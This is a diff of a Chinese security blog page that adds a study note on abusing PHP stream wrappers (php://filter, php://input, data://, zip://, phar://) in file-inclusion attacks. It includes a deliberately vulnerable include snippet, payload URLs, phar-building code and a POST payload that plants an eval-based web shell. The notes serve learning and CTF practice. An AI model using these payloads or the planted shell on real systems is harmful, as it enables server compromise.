@@ -6,20 +6,22 @@
   <meta name="keywords" content=" php , 伪协议 ">
   <meta name="description" content="php伪协议 | Sh@d0w&#39;s blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta name="description" content="转自CTF下的命令执行 0x00空格绕过常见的绕过符号有： $IFS$9 、${IFS} 、%09(php环境下)、 重定向符&lt;&gt;、&lt;、  $IFS在linux下表示分隔符，如果不加{}则bash会将IFS解释为一个变量名， 加一个{}就固定了变量名，$IFS$9后面之所以加个$是为了起到截断的作用0x01命令分隔%0a  --换行符，需要php环境 %0d  --回车符，需要p">
+<meta name="description" content="PHP文件包含漏洞利用思路与Bypass总结手册（一） PHP文件包含漏洞利用思路与Bypass总结手册（二） PHP文件包含漏洞利用思路与Bypass总结手册（三） PHP文件包含漏洞利用思路与Bypass总结手册（完结） 相关函数当利用这四个函数来包含文件时，不管文件是什么类型（图片、txt等等），都会直接作为php文件进行解析。 1、include()http:&#x2F;&#x2F;www.php.net&#x2F;m">
 <meta property="og:type" content="article">
-<meta property="og:title" content="命令执行">
-<meta property="og:url" content="https://shadow-zz.github.io/2020/05/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/index.html">
+<meta property="og:title" content="php文件包含">
+<meta property="og:url" content="https://shadow-zz.github.io/2020/05/14/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/index.html">
 <meta property="og:site_name" content="Sh@d0w&#39;s blog">
-<meta property="og:description" content="转自CTF下的命令执行 0x00空格绕过常见的绕过符号有： $IFS$9 、${IFS} 、%09(php环境下)、 重定向符&lt;&gt;、&lt;、  $IFS在linux下表示分隔符，如果不加{}则bash会将IFS解释为一个变量名， 加一个{}就固定了变量名，$IFS$9后面之所以加个$是为了起到截断的作用0x01命令分隔%0a  --换行符，需要php环境 %0d  --回车符，需要p">
+<meta property="og:description" content="PHP文件包含漏洞利用思路与Bypass总结手册（一） PHP文件包含漏洞利用思路与Bypass总结手册（二） PHP文件包含漏洞利用思路与Bypass总结手册（三） PHP文件包含漏洞利用思路与Bypass总结手册（完结） 相关函数当利用这四个函数来包含文件时，不管文件是什么类型（图片、txt等等），都会直接作为php文件进行解析。 1、include()http:&#x2F;&#x2F;www.php.net&#x2F;m">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://shadow-zz.github.io/2020/05/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20200509105742249-1588993641212.png">
-<meta property="article:published_time" content="2020-05-09T03:07:00.000Z">
-<meta property="article:modified_time" content="2020-05-09T03:08:30.309Z">
+<meta property="og:image" content="https://shadow-zz.github.io/2020/05/14/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200526163109745.png">
+<meta property="og:image" content="https://shadow-zz.github.io/2020/05/14/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200526163403165.png">
+<meta property="article:published_time" content="2020-05-14T03:49:08.000Z">
+<meta property="article:modified_time" content="2020-05-26T08:49:51.293Z">
 <meta property="article:author" content="Sh@d0w">
-<meta property="article:tag" content="命令执行">
+<meta property="article:tag" content="文件包含">
+<meta property="article:tag" content="php">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://shadow-zz.github.io/2020/05/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20200509105742249-1588993641212.png">
+<meta name="twitter:image" content="https://shadow-zz.github.io/2020/05/14/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200526163109745.png">
 
 
 <link rel="icon" href="/img/avatar.jpg">
@@ -102,7 +104,7 @@
 
 
 <ul>
-    <li><div class="all active">全部文章<small>(22)</small></div></li>
+    <li><div class="all active">全部文章<small>(23)</small></div></li>
     
         
             
@@ -114,11 +116,11 @@
     
         
             
-            <li><div data-rel="安全杂项"><i class="fold iconfont icon-right"></i>安全杂项<small>(8)</small></div>
+            <li><div data-rel="安全杂项"><i class="fold iconfont icon-right"></i>安全杂项<small>(9)</small></div>
                 
                     <ul class="sub hide">
                         
-                        <li><div data-rel="php">php<small>(3)</small></div>
+                        <li><div data-rel="php">php<small>(5)</small></div>
                             
                         </li>
                             
@@ -150,8 +152,8 @@
     </div>
     <div><a  class="friends">友链</a></div>
 </div>
-<input type="hidden" id="yelog_site_posts_number" value="22">
-<input type="hidden" id="yelog_site_word_count" value="15.1k">
+<input type="hidden" id="yelog_site_posts_number" value="23">
+<input type="hidden" id="yelog_site_word_count" value="17.4k">
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
     <span id="busuanzi_value_site_pv"></span>
@@ -181,103 +183,21 @@
             
             <li><a target="_blank" href="http://wiki.ioin.in/">Sec-News</a></li>
             
-            <li><a target="_blank" href="https://blog.nuptzj.cn/">画船</a></li>
-            
             <li><a target="_blank" href="https://nobb.site/">Hcamael</a></li>
             
             <li><a target="_blank" href="https://www.cnblogs.com/W4nder/">W4nder</a></li>
-            
-            <li><a target="_blank" href="https://blog.phoenixlzx.com/">凤凰</a></li>
-            
-            <li><a target="_blank" href="https://www.deamwork.com/">Jason</a></li>
-            
-            <li><a target="_blank" href="https://lightless.me/">lightless</a></li>
-            
-            <li><a target="_blank" href="http://libc.pw/">zh_explorer</a></li>
             
             <li><a target="_blank" href="http://www.xmsec.cc/">陌小生</a></li>
             
             <li><a target="_blank" href="http://joychou.org">JoyChou</a></li>
             
-            <li><a target="_blank" href="http://www.angelwhu.com/blog/">angelwhu</a></li>
-            
-            <li><a target="_blank" href="http://riusksk.me/">泉哥</a></li>
-            
-            <li><a target="_blank" href="http://avfisher.win">安全小飞侠</a></li>
-            
             <li><a target="_blank" href="http://www.lijiejie.com/">李劼杰</a></li>
-            
-            <li><a target="_blank" href="http://woldy.net/">无所不能的魂大人</a></li>
-            
-            <li><a target="_blank" href="http://www.blogsir.com.cn/">江sir</a></li>
-            
-            <li><a target="_blank" href="http://bestwing.me/">swing</a></li>
-            
-            <li><a target="_blank" href="https://www.jarviswang.me/">Jarvis</a></li>
-            
-            <li><a target="_blank" href="http://blog.orange.tw/">Orange</a></li>
-            
-            <li><a target="_blank" href="http://www.cizel.cn/">Cizel</a></li>
-            
-            <li><a target="_blank" href="http://gcli.cn/">Atum</a></li>
-            
-            <li><a target="_blank" href="http://www.cnblogs.com/0xJDchen/">0xJDchen</a></li>
-            
-            <li><a target="_blank" href="https://tennc.github.io/">tennc</a></li>
-            
-            <li><a target="_blank" href="http://rockyrays.me/">Rocky</a></li>
-            
-            <li><a target="_blank" href="http://anciety.cn">Anciety</a></li>
-            
-            <li><a target="_blank" href="https://bl4ck.in/">Tomato</a></li>
-            
-            <li><a target="_blank" href="http://www.tomyxy.com">Tomyxy</a></li>
-            
-            <li><a target="_blank" href="http://brieflyx.me/">BrieflyX</a></li>
-            
-            <li><a target="_blank" href="http://rootkiter.com">RootKiter</a></li>
             
             <li><a target="_blank" href="http://www.bertramc.cn">berTrAM</a></li>
             
-            <li><a target="_blank" href="https://winter3un.github.io/">WinterSun</a></li>
-            
-            <li><a target="_blank" href="https://evilchurch.cc/">EvilChurch</a></li>
-            
-            <li><a target="_blank" href="http://momomoxiaoxi.com/">小西</a></li>
-            
-            <li><a target="_blank" href="http://ecma.io/">该隐</a></li>
-            
-            <li><a target="_blank" href="http://www.cnseay.com/">Seay</a></li>
-            
-            <li><a target="_blank" href="http://xxlegend.com/">廖新喜</a></li>
-            
-            <li><a target="_blank" href="http://www.yulegeyu.com/">雨了个雨</a></li>
-            
-            <li><a target="_blank" href="http://www.cnblogs.com/Ox9A82/">Ox9A82</a></li>
-            
-            <li><a target="_blank" href="http://whereisk0shl.top/">k0shl</a></li>
-            
-            <li><a target="_blank" href="http://blog.fatezero.org">fate0</a></li>
-            
-            <li><a target="_blank" href="http://lu4n.com/">luan</a></li>
-            
-            <li><a target="_blank" href="http://blog.csdn.net/niexinming">聂心明</a></li>
-            
-            <li><a target="_blank" href="https://firmianay.github.io/">Firmy</a></li>
-            
-            <li><a target="_blank" href="https://sploitfun.wordpress.com/">sploitfun</a></li>
-            
-            <li><a target="_blank" href="http://blog.th3s3v3n.xyz">他是鹿</a></li>
-            
-            <li><a target="_blank" href="http://ijz.me">虫虫之家</a></li>
-            
-            <li><a target="_blank" href="http://rm-rf.gg/">evi1m0</a></li>
-            
-            <li><a target="_blank" href="http://weaponx.site">WeaponX</a></li>
+            <li><a target="_blank" href="http://blog.seay.me/">Seay</a></li>
             
             <li><a target="_blank" href="http://foreversong.cn/">ADog’s</a></li>
-            
-            <li><a target="_blank" href="http://mxny.org/">麦香师傅</a></li>
             
         </ul>
     </div>
@@ -392,6 +312,14 @@
     
     <nav id="title-list-nav">
         
+        <a  class="安全杂项 php "
+           href="/2020/05/14/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"
+           data-tag="文件包含,php"
+           data-author="" >
+            <span class="post-title" title="php文件包含">php文件包含</span>
+            <span class="post-date" title="2020-05-14 11:49:08">2020/05/14</span>
+        </a>
+        
         <a  class="安全杂项 "
            href="/2020/05/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"
            data-tag="命令执行"
@@ -400,7 +328,7 @@
             <span class="post-date" title="2020-05-09 11:07:00">2020/05/09</span>
         </a>
         
-        <a  class="安全杂项 "
+        <a  class="安全杂项 php "
            href="/2020/05/08/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"
            data-tag="php,伪协议"
            data-author="" >
@@ -590,7 +518,9 @@
         
         <span class="book">
             
-                <a  data-rel="安全杂项">安全杂项</a>
+                <a  data-rel="安全杂项">安全杂项</a>/
+            
+                <a  data-rel="php">php</a>
             
         </span>
         
@@ -606,12 +536,12 @@
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2020-05-08 15:48:07'>2020-05-08 15:47</time>
+        创建时间:<time class="date" title='更新时间: 2020-05-14 16:26:31'>2020-05-08 15:47</time>
         
     </div>
     <div class="article-meta">
         
-        <span>字数:0</span>
+        <span>字数:1.5k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -641,7 +571,7 @@
     
     <div class="toc-ref">
     
-        
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#file"><span class="toc-text">file:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#php"><span class="toc-text">php:&#x2F;&#x2F;</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#php-filter"><span class="toc-text">php:&#x2F;&#x2F;filter</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php-input"><span class="toc-text">php:&#x2F;&#x2F;input</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#zip-amp-bzip2-amp-zlib"><span class="toc-text">zip:&#x2F;&#x2F; &amp; bzip2:&#x2F;&#x2F; &amp; zlib:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#data"><span class="toc-text">data:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#phar"><span class="toc-text">phar:&#x2F;&#x2F;</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -657,7 +587,280 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        
+        <p>摘自：</p>
+<p><a href="https://segmentfault.com/a/1190000018991087" target="_blank" rel="noopener">PHP伪协议总结</a></p>
+<p><a href="https://www.freebuf.com/column/148886.html" target="_blank" rel="noopener">php伪协议实现命令执行的七种姿势</a></p>
+<p><a href="https://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&mid=2652854852&idx=1&sn=0154f9bc04d0eccf7069c4a70a55edef&chksm=bd5926898a2eaf9fd700b394150a34ce46b663f8cc018015559d99517aae8cdb2d2d1c687d95&mpshare=1&scene=1&srcid=&sharer_sharetime=1587870952719&sharer_shareid=6118a6f7ffcd4dac97886912e9b73576&key=111d5d7ed497d596b9d15f860d702744833a50d2fc3434d3857d2b9415f66e0e396ec9e9c3f8b9204420d4be7d84da6c4c588c31b8cdad5dd781bce8c4e264924662a4f2d243349356c99a1662efc843&ascene=14&uin=MTg3Njc1MzQzOQ%3D%3D&devicetype=Windows+10+x64&version=62090072&lang=zh_CN&exportkey=A1d5eEUJf5drQbwWaUBxzL0%3D&pass_ticket=QOlMB4M4k9vD8DXbpX%2FhZGNLnlXmdsRbjOaewsoA2GCY%2B9uTwXfcE7pzq5ShhQ47" target="_blank" rel="noopener">PHP文件包含漏洞利用思路与Bypass总结手册（一）</a></p>
+<pre><code class="php">#include.php
+
+&lt;?php include($_GET[&#39;file&#39;]); ?&gt;</code></pre>
+<h1 id="file"><a href="#file" class="headerlink" title="file://"></a>file://</h1><p>allow_url_fopen ：off/on</p>
+<p>allow_url_include：off/on</p>
+<p><strong>用法：</strong></p>
+<pre><code>/path/to/file.ext
+relative/path/to/file.ext
+fileInCwd.ext
+C:/path/to/winfile.ext
+C:\path\to\winfile.ext
+\\smbserver\share\path\to\winfile.ext
+file:///path/to/file.ext</code></pre><p><strong>用法示例：</strong></p>
+<ul>
+<li><p>file://[文件的绝对路径和文件名]<br><code>file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt</code></p>
+</li>
+<li><p>[文件的相对路径和文件名]</p>
+<p><code>file=./phpinfo.txt</code></p>
+</li>
+<li><p>[http：//网络路径和文件名]</p>
+<p><code>file=http://xxxxx/phpinfo.txt</code></p>
+</li>
+</ul>
+<h1 id="php"><a href="#php" class="headerlink" title="php://"></a>php://</h1><p>不需要开启allow_url_fopen，仅php://input、 php://stdin、 php://memory 和 php://temp 需要开启allow_url_include。</p>
+<table>
+<thead>
+<tr>
+<th>协议</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>php://input</td>
+<td>可以访问请求的原始数据的只读流，在POST请求中访问POST的<code>data</code>部分，在<code>enctype=&quot;multipart/form-data&quot;</code> 的时候<code>php://input</code>是无效的。</td>
+</tr>
+<tr>
+<td>php://output</td>
+<td>只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。</td>
+</tr>
+<tr>
+<td>php://fd</td>
+<td>(&gt;=5.3.6)允许直接访问指定的文件描述符。例如 <code>php://fd/3</code> 引用了文件描述符 3。</td>
+</tr>
+<tr>
+<td>php://memory php://temp</td>
+<td>(&gt;=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 <code>php://memory</code> 总是把数据储存在内存中，而 <code>php://temp</code> 会在内存量达到预定义的限制后（默认是 <code>2MB</code>）存入临时文件中。临时文件位置的决定和 <code>sys_get_temp_dir()</code> 的方式一致。</td>
+</tr>
+<tr>
+<td>php://filter</td>
+<td>(&gt;=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式<code>（all-in-one）</code>的文件函数非常有用，类似 <code>readfile()</code>、<code>file()</code> 和 <code>file_get_contents()</code>，在数据流内容读取之前没有机会应用其他过滤器。</td>
+</tr>
+</tbody></table>
+<h2 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h2><p>allow_url_fopen ：off/on</p>
+<p>allow_url_include：off/on</p>
+<table>
+<thead>
+<tr>
+<th>php://filter 参数</th>
+<th align="center">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>resource=&lt;要过滤的数据流&gt;</td>
+<td align="center">必须项。它指定了你要筛选过滤的数据流。</td>
+</tr>
+<tr>
+<td>read=&lt;读链的过滤器&gt;</td>
+<td align="center">可选项。可以设定一个或多个过滤器名称，以管道符（/）分隔。</td>
+</tr>
+<tr>
+<td>write=&lt;写链的过滤器&gt;</td>
+<td align="center">可选项。可以设定一个或多个过滤器名称，以管道符（/）分隔。</td>
+</tr>
+<tr>
+<td>&lt;; 两个链的过滤器&gt;</td>
+<td align="center">任何没有以 <em>read=</em> 或 <em>write=</em> 作前缀的筛选器列表会视情况应用于读或写链。</td>
+</tr>
+</tbody></table>
+<p><strong>可用的过滤器列表（4类）</strong></p>
+<table>
+<thead>
+<tr>
+<th>字符串过滤器</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>string.rot13</td>
+<td>等同于<code>str_rot13()</code>，rot13变换</td>
+</tr>
+<tr>
+<td>string.toupper</td>
+<td>等同于<code>strtoupper()</code>，转大写字母</td>
+</tr>
+<tr>
+<td>string.tolower</td>
+<td>等同于<code>strtolower()</code>，转小写字母</td>
+</tr>
+<tr>
+<td>string.strip_tags</td>
+<td>等同于<code>strip_tags()</code>，去除html、PHP语言标签</td>
+</tr>
+</tbody></table>
+<br>
+
+<table>
+<thead>
+<tr>
+<th>转换过滤器</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>convert.base64-encode &amp; convert.base64-decode</td>
+<td>等同于<code>base64_encode()</code>和<code>base64_decode()</code>，base64编码解码</td>
+</tr>
+<tr>
+<td>convert.quoted-printable-encode &amp; convert.quoted-printable-decode</td>
+<td>quoted-printable 字符串与 8-bit 字符串编码解码</td>
+</tr>
+</tbody></table>
+<br>
+
+<table>
+<thead>
+<tr>
+<th>压缩过滤器</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>zlib.deflate &amp; zlib.inflate</td>
+<td>在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。</td>
+</tr>
+<tr>
+<td>bzip2.compress &amp; bzip2.decompress</td>
+<td>同上，在本地文件系统中创建 bz2 兼容文件的方法。</td>
+</tr>
+</tbody></table>
+<br>
+
+<table>
+<thead>
+<tr>
+<th>加密过滤器</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>mcrypt.*</td>
+<td>libmcrypt 对称加密算法</td>
+</tr>
+<tr>
+<td>mdecrypt.*</td>
+<td>libmcrypt 对称解密算法</td>
+</tr>
+</tbody></table>
+<br>
+
+<p>用法示例：</p>
+<ul>
+<li><code>php://filter/read=convert.base64-encode/resource=index.php</code></li>
+<li><code>php://filter/convert.base64-encode/resource=index.php</code></li>
+</ul>
+<h2 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h2><p>可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。</p>
+<p>allow_url_fopen ：off/on</p>
+<p>allow_url_include：on</p>
+<p><strong>用法示例：</strong></p>
+<ul>
+<li><p><code>file=php://input</code></p>
+<p>[POST DATA]：</p>
+<p><code>&lt;?php phpinfo(); ?&gt;</code></p>
+</li>
+<li><p><code>file=php://input</code><br>[POST DATA]：<br><code>&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_GET[cmd]);?&gt;&#39;); ?&gt;</code></p>
+</li>
+</ul>
+<h1 id="zip-amp-bzip2-amp-zlib"><a href="#zip-amp-bzip2-amp-zlib" class="headerlink" title="zip:// &amp; bzip2:// &amp; zlib://"></a>zip:// &amp; bzip2:// &amp; zlib://</h1><p>allow_url_fopen ：off/on</p>
+<p>allow_url_include：off/on</p>
+<p><strong>用法示例</strong>：</p>
+<ul>
+<li><p>zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]（#编码为%23）</p>
+<p><strong>利用条件</strong>：php &gt;= 5.2（绝对路径） | php &gt;= 5.29（相对/绝对路径）</p>
+<p>使用zip协议，需将<code>#</code>编码为<code>%23</code>(浏览器时)</p>
+<p>压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传</p>
+<p><code>file=zip://phpinfo.jpg%23phpinfo.txt</code></p>
+</li>
+<li><p>compress.bzip2://file.bz2</p>
+<p><strong>利用条件</strong>：php &gt;= 5.2</p>
+<p>压缩 phpinfo.txt 为 phpinfo.bz2 并上传（同样支持任意后缀名）</p>
+<p><code>file=compress.bzip2://phpinfo.bz2</code></p>
+<p><code>file=compress.bzip2://phpinfo.jpg</code></p>
+</li>
+<li><p>compress.zlib://file.gz</p>
+<p><strong>利用条件</strong>：php &gt;= 5.2</p>
+<p>压缩 phpinfo.txt 为 phpinfo.gz 并上传（同样支持任意后缀名）</p>
+<p><code>file=compress.zlib://phpinfo.gz</code></p>
+<p><code>file=compress.zlib://phpinfo.jpg</code></p>
+</li>
+</ul>
+<h1 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h1><p><strong>用法</strong>：</p>
+<pre><code>data:,&lt;文本数据&gt; 
+data:text/plain,&lt;文本数据&gt;
+data:text/html,&lt;HTML代码&gt;
+data:text/html;base64,&lt;base64编码的HTML代码&gt;
+data:text/css,&lt;CSS代码&gt;
+data:text/css;base64,&lt;base64编码的CSS代码&gt;
+data:text/javascript,&lt;Javascript代码&gt;
+data:text/javascript;base64,&lt;base64编码的Javascript代码&gt;
+data:image/gif;base64,base64编码的gif图片数据
+data:image/png;base64,base64编码的png图片数据
+data:image/jpeg;base64,base64编码的jpeg图片数据
+data:image/x-icon;base64,base64编码的icon图片数据</code></pre><p><strong>利用条件</strong>：</p>
+<p>php &gt;= 5.2</p>
+<p>allow_url_fopen = On</p>
+<p>allow_url_include = On</p>
+<p><strong>用法示例：</strong></p>
+<ul>
+<li><p>data://text/plain,    或    data:text/plain,</p>
+<p><code>file=data://text/plain,&lt;?php%20phpinfo();?&gt;</code></p>
+</li>
+<li><p>data://text/plain;base64,   或    data:text/plain;base64,</p>
+<p><code>file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</code></p>
+</li>
+</ul>
+<h1 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h1><p><code>phar://</code>协议与<code>zip://</code>类似，同样可以访问zip格式压缩包内容</p>
+<p><strong>用法：</strong></p>
+<ul>
+<li>?file=phar://[压缩包文件相对路径]/[压缩文件内的子文件名]</li>
+<li>?file=phar://[压缩包文件绝对路径]/[压缩文件内的子文件名]</li>
+</ul>
+<p><strong>用法示例</strong>：</p>
+<ul>
+<li><code>include.php?file=phar://phpinfo.zip/phpinfo.txt</code></li>
+</ul>
+<p><strong>制作phar文件</strong>：</p>
+<ul>
+<li><p>（1）确保本地<code>php.ini</code>中<code>phar.readonly=Off</code></p>
+<p><img src="/2020/05/08/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/image-20200514155709757.png" alt></p>
+</li>
+<li><p>（2）编写恶意phar文件的php脚本</p>
+<pre><code class="php">#phar.php 
+&lt;?php
+    @unlink(&quot;phar.phar&quot;);
+    $phar = new Phar(&quot;phar.phar&quot;);
+    $phar-&gt;startBuffering();
+    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);  //设置stub
+    $phar-&gt;addFromString(&quot;phpinfo.txt&quot;, &quot;&lt;?php phpinfo();?&gt;&quot;);  //添加要压缩的文件及内容
+    //签名自动计算 
+    $phar-&gt;stopBuffering();
+?&gt;
+
+#phar1.php
+&lt;?php 
+$p = new PharData(dirname(__FILE__).&#39;/phartest.jpg&#39;, 0,&#39;phartest&#39;,Phar::ZIP) ;
+$p-&gt;addFromString(&#39;phpinfo.txt&#39;, &#39;&lt;?php phpinfo();?&gt;&#39;); 
+?&gt;</code></pre>
+</li>
+<li><p>（3）生成phar文件</p>
+<p><img src="/2020/05/08/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/image-20200514160434183.png" alt></p>
+<p><img src="/2020/05/08/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/image-20200514162452426.png" alt></p>
+</li>
+</ul>
+<p>利用条件**：php &gt;= 5.3.0</p>
+<p><strong>利用姿势</strong>：</p>
+<ul>
+<li>file=phar://phar.phar/phpinfo.txt</li>
+<li>file=phar://phar.jpg/phpinfo.txt</li>
+</ul>
+<p><img src="https://image.3001.net/images/20170925/15063209941952.png" alt></p>
+
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
     </div>
@@ -667,10 +870,10 @@
 
 <div class="article_copyright">
     <p><span class="copy-title">文章标题:</span>php伪协议</p>
-    <p><span class="copy-title">文章字数:</span><span class="post-count">0</span></p>
+    <p><span class="copy-title">文章字数:</span><span class="post-count">1.5k</span></p>
     <p><span class="copy-title">本文作者:</span><a  title="Sh@d0w">Sh@d0w</a></p>
     <p><span class="copy-title">发布时间:</span>2020-05-08, 15:47:39</p>
-    <p><span class="copy-title">最后更新:</span>2020-05-08, 15:48:07</p>
+    <p><span class="copy-title">最后更新:</span>2020-05-14, 16:26:31</p>
     <span class="copy-title">原始链接:</span><a class="post-url" href="/2020/05/08/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/" title="php伪协议">https://shadow-zz.github.io/2020/05/08/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
